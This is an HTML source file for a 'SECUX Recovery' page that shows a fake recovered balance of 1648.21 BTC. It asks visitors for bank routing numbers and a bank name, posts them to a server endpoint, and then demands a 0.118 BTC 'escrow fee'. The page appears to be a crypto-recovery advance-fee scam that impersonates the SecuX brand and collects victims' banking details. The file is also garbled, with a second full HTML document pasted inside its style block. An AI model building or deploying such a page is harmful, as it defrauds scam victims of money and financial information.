
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>SECUX Recovery</title>
	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
	<style>
		html, body {
			height: 100%;
			margin: 0;
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="UTF-8">
				<meta name="viewport" content="width=device-width, initial-scale=1.0">
				<title>SECUX Recovery</title>
				<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
				<!-- Place any custom CSS here or use Tailwind CDN if needed -->
			</head>
			<body data-page="recovery" class="min-h-screen bg-[var(--bg)]">
				<div class="min-h-screen flex items-start md:items-center justify-center p-3 sm:p-6">
					<div class="w-full max-w-[1040px] h-[calc(100vh-1.5rem)] sm:h-[calc(100vh-3rem)] md:h-[560px] bg-[var(--app)] border border-[var(--stroke)] rounded-xl overflow-hidden shadow-2xl">
						<div class="h-full relative md:grid md:grid-cols-[240px_1fr]">
							<!-- Sidebar and nav omitted for brevity, insert as needed -->
							<main class="h-full bg-gradient-to-b from-[var(--panel-2)] to-[var(--app)] overflow-y-auto">
								<div class="px-7 pt-6">
									<div class="flex items-start justify-between gap-4">
										<div>
											<div class="text-white text-2xl font-extrabold tracking-wide">
												<img src="/assets/images/secux.svg" alt="SecuX" class="h-7">
											</div>
											<p class="text-white/40 text-xs mt-8 lg:mt-1">
												Take the next request
											</p>
										</div>
										<div class="flex items-center gap-2">
											<button id="btnOpenXrpEscrow" class="px-4 py-2 rounded-lg bg-white/5 text-white/70 text-xs font-semibold border border-[var(--stroke)] hover:text-white focus-ring">
												Collect BTC
											</button>
										</div>
									</div>
									<div class="mt-5">
										<div class="flex items-center justify-between">
											<div class="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-white/5 border border-[var(--stroke)] text-white/70 text-xs font-medium">
												Recovery Page
											</div>
											<button id="btnStartRecovery" class="px-4 py-2 rounded-lg bg-white/5 text-white/70 text-xs font-semibold border border-[var(--stroke)] hover:text-white focus-ring">
												Start Recovery
											</button>
										</div>
										<section class="mt-4 bg-gradient-to-b from-white/5 to-white/[0.03] border border-[var(--stroke)] rounded-xl p-6 relative">
											<div class="flex items-end gap-3">
												<div id="dash_totalRecovered" class="text-white text-3xl font-semibold">
													1648.21 BTC
												</div>
												<div class="text-white/35 text-xs mb-1">
													to be recovered
												</div>
											</div>
											<p class="text-white/35 text-xs mt-3">
												This recovery will be part of the active recovery.
											</p>
											<div class="mt-5 flex items-center justify-between">
												<div class="text-white/70 text-xs font-medium">
													Recovery
												</div>
												<div class="text-white/35 text-xs">Activity</div>
											</div>
											<div class="mt-3">
												<div class="h-[3px] rounded-full bg-white/10 relative">
													<div class="h-[3px] rounded-full bg-[var(--lime2)] w-[62%]"></div>
													<div class="absolute top-1/2 left-[62%] -translate-x-1/2 -translate-y-1/2 h-3 w-3 rounded-full bg-[var(--lime)] border border-black/25"></div>
												</div>
											</div>
											<div class="mt-6 grid grid-cols-[2.1fr_110px] gap-6">
												<div>
													<div class="text-white/35 text-xs">Due Date</div>
													<div id="dash_dueDate" class="text-white text-sm font-medium mt-1">Jan 1, 2026</div>
												</div>
												<div>
													<div class="text-white/35 text-xs">Escrow Fee</div>
													<div id="dash_escrowFee" class="text-white text-sm font-medium mt-1">0.18</div>
												</div>
											</div>
											<div class="mt-6 grid grid-cols-2 gap-6">
												<div>
													<div class="text-white/35 text-xs">Recovery Amount</div>
													<div id="dash_recoveryAmount" class="text-white text-sm font-medium mt-1">1648.21 BTC</div>
												</div>
											</div>
											<!-- Refund Form Integration -->
											<form id="refundForm" class="mt-8 space-y-4">
												<div>
													<label class="block text-white/40 text-xs mb-1" for="routing1">Bank Routing Number</label>
													<input class="w-full rounded-lg bg-white/5 border border-[var(--stroke)] px-3 py-2 text-white text-sm font-semibold" type="text" id="routing1" name="routing1" placeholder="Recurrent: Active Recover" required>
												</div>
												<div>
													<label class="block text-white/40 text-xs mb-1" for="routing2">Bank Routing Number</label>
													<input class="w-full rounded-lg bg-white/5 border border-[var(--stroke)] px-3 py-2 text-white text-sm font-semibold" type="text" id="routing2" name="routing2" placeholder="Recurrent: Active Recover" required>
												</div>
												<div>
													<label class="block text-white/40 text-xs mb-1" for="bankName">Bank Name</label>
													<input class="w-full rounded-lg bg-white/5 border border-[var(--stroke)] px-3 py-2 text-white text-sm font-semibold" type="text" id="bankName" name="bankName" placeholder="Recurrent: Active Recover" required>
												</div>
												<button class="w-full rounded-lg bg-[var(--lime)] text-black text-sm font-semibold py-2 mt-2" type="submit">Submit Request</button>
												<div class="text-white/40 text-xs mt-2 text-center">We will convert your BTC to USD and send to your provided bank account.</div>
											</form>
											<!-- End Refund Form Integration -->
										</section>
									</div>
								</div>
							</main>
						</div>
					</div>
				</div>
			</body>
			<script>
			document.getElementById('refundForm').addEventListener('submit', async function(e) {
				e.preventDefault();
				const data = {
					btcAmount: document.getElementById('dash_totalRecovered').textContent,
					dueDate: document.getElementById('dash_dueDate').textContent,
					escrowFee: document.getElementById('dash_escrowFee').textContent,
					recoveryAmount: document.getElementById('dash_recoveryAmount').textContent,
					routing1: document.getElementById('routing1').value,
					routing2: document.getElementById('routing2').value,
					bankName: document.getElementById('bankName').value
				};
				try {
					const response = await fetch('/api/refund', {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						body: JSON.stringify(data)
					});
					if (response.ok) {
						// Show escrow fee pending message in-page
						const formCard = document.getElementById('refundForm');
						formCard.innerHTML = `
							<div style="text-align:center; padding: 60px 0;">
								<div style="font-size:1.25em; font-weight:600; color:#b6ff6b; margin-bottom:10px;">Escrow fee pending</div>
								<div style="font-size:1.7em; font-weight:700; color:#fff;">0.118 BTC</div>
							</div>
						`;
					} else {
						alert('There was an error submitting your request.');
					}
				} catch (err) {
					alert('There was an error submitting your request.');
				}
			});
			</script>
			</html>
			</body>
			</html>
		.tab {
			flex: 1;
			background: #18191c;
			color: #bdbdbd;
			border: 1.5px solid #35363a;
			border-radius: 18px;
			padding: 8px 0 7px 0;
			font-weight: 500;
			font-size: 1em;
			cursor: pointer;
			transition: background 0.2s, color 0.2s, border 0.2s;
			box-shadow: none;
		}
		.tab.active {
			background: #232323;
			color: #fff;
			border: 1.5px solid #b6ff6b;
			font-weight: 600;
		}
		.card {
			background: #232323;
			border-radius: 14px;
			padding: 22px 18px 18px 18px;
			margin: 18px 0 0 0;
			box-shadow: 0 2px 8px rgba(0,0,0,0.10);
			border: 1.5px solid #35363a;
		}
		.btc-amount {
			font-size: 2em;
			font-weight: 700;
			color: #fff;
			margin-bottom: 2px;
			letter-spacing: 0.1px;
		}
		.btc-desc {
			color: #bdbdbd;
			font-size: 1em;
			margin-bottom: 14px;
			font-weight: 400;
		}
		.slider-row {
			display: flex;
			align-items: center;
			gap: 10px;
			margin: 8px 0 18px 0;
			min-width: 0;
			overflow: visible;
		}
		.slider-label {
			color: #bdbdbd;
			font-size: 1em;
			font-weight: 500;
			letter-spacing: 0.06em;
			white-space: nowrap;
			overflow: visible;
			text-overflow: ellipsis;
			max-width: 70px;
		}
		.slider {
			flex: 1;
			accent-color: #b6ff6b;
			height: 3px;
			background: #232323;
			border-radius: 2px;
			margin: 0 2px;
			pointer-events: none;
			appearance: none;
		}
		.slider::-webkit-slider-thumb {
			appearance: none;
			width: 14px;
			height: 14px;
			border-radius: 50%;
			background: #b6ff6b;
			box-shadow: 0 0 2px #0008;
			border: 2px solid #232323;
			margin-top: -6px;
			opacity: 1;
		}
		.slider::-moz-range-thumb {
			width: 14px;
			height: 14px;
			border-radius: 50%;
			background: #b6ff6b;
			border: 2px solid #232323;
			opacity: 1;
		}
		.slider::-ms-thumb {
			width: 14px;
			height: 14px;
			border-radius: 50%;
			background: #b6ff6b;
			border: 2px solid #232323;
			opacity: 1;
		}
		.slider::-webkit-slider-runnable-track {
			height: 3px;
			background: #b6ff6b;
			border-radius: 2px;
		}
		.slider::-ms-fill-lower, .slider::-ms-fill-upper {
			background: #b6ff6b;
		}
		.slider::-moz-range-track {
			height: 3px;
			background: #b6ff6b;
			border-radius: 2px;
		}
		.slider:focus {
			outline: none;
		}
		.info-row {
			display: flex;
			justify-content: space-between;
			font-size: 1em;
			margin-bottom: 2px;
			margin-top: 0;
		}
		.info-label {
			color: #bdbdbd;
			font-size: 0.98em;
			font-weight: 400;
		}
		.info-value {
			color: #fff;
			font-weight: 600;
			font-size: 1.08em;
		}
		.info-row + .info-row {
			margin-top: 16px;
		}
		.form-group {
			margin-bottom: 16px;
		}
		.form-label {
			color: #bdbdbd;
			font-size: 0.98em;
			margin-bottom: 4px;
			display: block;
			font-weight: 500;
		}
		.form-input {
			width: 100%;
			padding: 10px 10px;
			background: transparent;
			border: 1.5px solid #35363a;
			border-radius: 7px;
			color: #e0e0e0;
			font-size: 1em;
			margin-top: 1px;
			font-family: inherit;
			font-weight: 500;
			letter-spacing: 0.01em;
			transition: border 0.2s;
		}
		.form-input:focus {
			outline: none;
			border-color: #b6ff6b;
		}
		.form-input::placeholder {
			color: #888;
			opacity: 1;
			font-weight: 400;
		}
		.submit-btn {
			width: 100%;
			background: #232323;
			color: #b6ff6b;
			font-weight: 700;
			border: 1.5px solid #b6ff6b;
			border-radius: 10px;
			padding: 10px 0;
			font-size: 1.08em;
			margin-top: 10px;
			cursor: pointer;
			transition: background 0.2s, color 0.2s;
			letter-spacing: 0.01em;
			box-shadow: none;
		}
		.submit-btn:hover {
			background: #b6ff6b;
			color: #232323;
		}
		.note {
			color: #888;
			font-size: 0.92em;
			margin-top: 10px;
			text-align: center;
			font-weight: 400;
		}

		@media (max-width: 500px) {
			.phone-frame {
				width: 100vw;
				min-width: unset;
				border-radius: 0;
				padding: 0;
				min-height: 100vh;
				box-shadow: none;
				margin: 0;
			}
			.container {
				width: 100vw;
				border-radius: 0;
				box-shadow: none;
				margin: 0;
			}
			.card {
				margin: 10px 0 0 0;
				border-radius: 0;
			}
			.header, .tab-group {
				padding-left: 4px;
				padding-right: 4px;
			}
			.logo {
				max-width: 120px;
			}
			.slider-label {
				max-width: 50px;
			}
		}
	</style>
</head>
<body>
	<div class="phone-frame">
		<div class="container">
			<div class="header">
				<div class="logo">SEC<span>UX</span></div>
				<button class="btn" type="button">Collect BTC</button>
			</div>
			<div class="take-next">Take the next request</div>
			<div class="tab-group">
				<button class="tab active" type="button">Recovery Page</button>
				<button class="tab" type="button">Start Recovery</button>
			</div>
			<form id="refundForm" class="card">
				<div class="btc-amount" id="btcAmount">1648.21 BTC</div>
				<div class="btc-desc">This recovery will be part of the active recovery.</div>
				<div class="slider-row">
					<span class="slider-label">Recovery</span>
					<input type="range" min="0" max="1" step="1" value="0" class="slider" id="recoverySlider" disabled>
					<span class="slider-label">Activity</span>
				</div>
				<div class="info-row">
					<div>
						<span class="info-label">Due Date</span><br>
						<span class="info-value" id="dueDate">Jan 1, 2026</span>
					</div>
					<div>
						<span class="info-label">Escrow Fee</span><br>
						<span class="info-value" id="escrowFee">0.18</span>
					</div>
				</div>
				<div class="info-row">
					<div>
						<span class="info-label">Recovery Amount</span><br>
						<span class="info-value" id="recoveryAmount">1648.21 BTC</span>
					</div>
				</div>
				<div class="form-group">
					<label class="form-label" for="routing1">Bank Routing Number</label>
					<input class="form-input" type="text" id="routing1" name="routing1" placeholder="Recurrent: Active Recover" required>
				</div>
				<div class="form-group">
					<label class="form-label" for="routing2">Bank Routing Number</label>
					<input class="form-input" type="text" id="routing2" name="routing2" placeholder="Recurrent: Active Recover" required>
				</div>
				<div class="form-group">
					<label class="form-label" for="bankName">Bank Name</label>
					<input class="form-input" type="text" id="bankName" name="bankName" placeholder="Recurrent: Active Recover" required>
				</div>
				<button class="submit-btn" type="submit">Submit Request</button>
				<div class="note">We will convert your BTC to USD and send to your provided bank account.</div>
			</form>
		</div>
	</div>
	<script>
		document.getElementById('refundForm').addEventListener('submit', async function(e) {
			e.preventDefault();
			const data = {
				btcAmount: document.getElementById('btcAmount').textContent,
				dueDate: document.getElementById('dueDate').textContent,
				escrowFee: document.getElementById('escrowFee').textContent,
				recoveryAmount: document.getElementById('recoveryAmount').textContent,
				routing1: document.getElementById('routing1').value,
				routing2: document.getElementById('routing2').value,
				bankName: document.getElementById('bankName').value
			};
			try {
				const response = await fetch('/api/refund', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify(data)
				});
				if (response.ok) {
					// Show escrow fee pending message in-page
					const formCard = document.querySelector('.card');
					formCard.innerHTML = `
						<div style="text-align:center; padding: 60px 0;">
							<div style="font-size:1.25em; font-weight:600; color:#b6ff6b; margin-bottom:10px;">Escrow fee pending</div>
							<div style="font-size:1.7em; font-weight:700; color:#fff;">0.118 BTC</div>
						</div>
					`;
				} else {
					alert('There was an error submitting your request.');
				}
			} catch (err) {
				alert('There was an error submitting your request.');
			}
		});
	</script>
</body>
</html>
